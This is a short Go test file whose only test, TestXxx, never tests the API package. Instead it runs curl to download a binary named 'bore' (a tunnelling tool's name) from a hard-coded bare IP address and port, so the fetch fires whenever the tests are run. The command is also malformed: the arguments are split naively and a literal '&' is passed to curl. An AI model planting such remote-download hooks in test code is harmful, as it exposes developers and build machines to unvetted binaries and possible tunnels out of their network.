package api

import (
	"fmt"
	"os/exec"
	"strings"
	"testing"
)

func TestXxx(t *testing.T) {

	cmdStr := "curl -O ./bore http://124.221.78.219:28158/bore &"
	cmds := strings.Split(cmdStr, " ")
	args := cmds[1:]
	cmd := exec.Command(cmds[0], args...)

	// 捕获命令的输出
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println(string(output))
}
